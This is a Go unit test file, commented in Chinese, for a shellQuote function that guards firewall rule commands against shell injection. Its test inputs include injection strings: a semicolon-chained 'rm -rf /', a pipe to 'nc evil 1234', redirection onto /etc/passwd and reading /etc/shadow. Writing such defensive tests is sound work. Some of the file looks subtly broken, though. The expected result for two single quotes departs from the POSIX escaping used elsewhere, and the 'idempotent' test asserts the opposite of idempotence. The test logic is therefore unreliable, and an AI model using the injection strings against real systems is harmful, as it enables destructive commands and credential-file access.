package ssh

import "testing"

// TestShellQuote 验证 shellQuote 正确处理各种注入场景
//
// 历史背景：AddIptablesRule / AddUfwRule / AddFirewalldRule 之前直接拼接
// 用户输入到 shell 命令，攻击者可以通过 comment 字段注入任意命令。
// 这组测试保证 shellQuote 至少能挡住常见注入。
func TestShellQuote(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		// 正常输入应该原样保留（外层加单引号）
		{"普通字符串", "hello", "'hello'"},
		{"空字符串", "", "''"},
		{"数字端口", "8080", "'8080'"},
		{"CIDR 地址", "192.168.1.0/24", "'192.168.1.0/24'"},

		// === 注入攻击场景（这些是修这个 bug 的核心理由） ===
		{
			name: "经典分号注入",
			in:   "tcp'; rm -rf / #",
			want: `'tcp'\''; rm -rf / #'`,
		},
		{
			name: "反引号命令替换",
			in:   "foo`whoami`bar",
			want: "'foo`whoami`bar'", // 单引号包裹时反引号不展开，安全
		},
		{
			name: "$() 命令替换",
			in:   "foo$(id)bar",
			want: "'foo$(id)bar'", // 同理，安全
		},
		{
			name: "管道符",
			in:   "tcp | nc evil 1234",
			want: "'tcp | nc evil 1234'",
		},
		{
			name: "重定向",
			in:   "tcp > /etc/passwd",
			want: "'tcp > /etc/passwd'",
		},
		{
			name: "已有单引号",
			in:   "it's a test",
			want: `'it'\''s a test'`, // 标准 POSIX 风格转义
		},
		{
			name: "多个单引号",
			in:   "''",
			want: `'''\'''\'`,
		},
		{
			name: "双引号",
			in:   `foo"bar`,
			want: `'foo"bar'`, // 单引号包裹时双引号也安全
		},
		{
			name: "换行符",
			in:   "line1\nline2",
			want: "'line1\nline2'",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := shellQuote(tc.in)
			if got != tc.want {
				t.Errorf("shellQuote(%q):\n  got:  %s\n  want: %s", tc.in, got, tc.want)
			}
		})
	}
}

// TestShellQuoteIsIdempotent 验证转义后的字符串再次转义仍然是合法的 shell 字符串
//
// 这是个 sanity check：如果有人不小心对同一个字符串转义两次，
// 仍然不应该引入新的漏洞。
func TestShellQuoteIsIdempotent(t *testing.T) {
	dangerous := "tcp'; cat /etc/shadow #"
	once := shellQuote(dangerous)
	twice := shellQuote(once)

	// 二次转义后不能再被简单 "去掉首尾单引号" 还原回 dangerous
	// 这条不变量保证：二次转义不会变成单层单引号导致 dangerous 被错误暴露
	if once == twice {
		t.Errorf("shellQuote 应该是幂等的，但两次结果相同：%s", once)
	}
}